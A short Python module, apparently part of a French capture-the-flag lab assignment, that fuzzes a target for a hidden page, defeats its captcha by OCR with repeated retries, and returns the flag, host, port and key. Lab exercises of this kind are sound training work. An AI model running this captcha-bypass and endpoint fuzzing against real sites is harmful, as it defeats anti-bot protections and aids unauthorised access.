import requests

from tp3.utils.captcha import resoudre_captcha
from tp3.utils.fuzzing import charger_wordlist, trouver_endpoint

MAX_ESSAIS = 10


def phase_web(target: str) -> dict:
    """
    on trouve la page cachée par fuzzing, on casse le captcha et on envoie le code ;
    on réessaie si l'OCR se trompe, puis on renvoie flag1, host, port et la clé
    """
    cible = target.rstrip("/")
    chemin = trouver_endpoint(cible, charger_wordlist())
    url = f"{cible}/{chemin}"

    session = requests.Session()
    for _ in range(MAX_ESSAIS):
        session.get(url)
        image = session.get(f"{cible}/captcha.png").content
        code = resoudre_captcha(image)
        reponse = session.post(url, data={"captcha": code})
        if reponse.status_code == 200:
            return reponse.json()

    raise RuntimeError("captcha non résolu après plusieurs essais")
